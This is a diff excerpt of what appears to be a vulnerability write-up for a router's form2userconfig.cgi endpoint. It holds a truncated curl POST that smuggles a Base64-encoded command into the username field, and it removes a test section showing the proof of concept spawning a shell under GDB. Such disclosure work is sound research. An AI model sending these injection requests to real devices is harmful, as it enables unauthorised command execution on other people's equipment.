@@ -29,16 +29,3 @@ curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Jzt
 ```
 It will decode our command Base64 and execute it 
 
-##### TEST
-
-​	First run our POC
-
-<img src="./img/image-20210819160553286.png" alt="image-20210819160553286" style="zoom:50%;" />
-
-​	GDB stops at the command we are about to execute
-
-<img src="./img/image-20210819160627461.png" alt="image-20210819160627461" style="zoom:50%;" />
-
-​	Successfully executed sh
-
-<img src="./img/image-20210819161606757.png" alt="image-20210819161606757" style="zoom:50%;" />
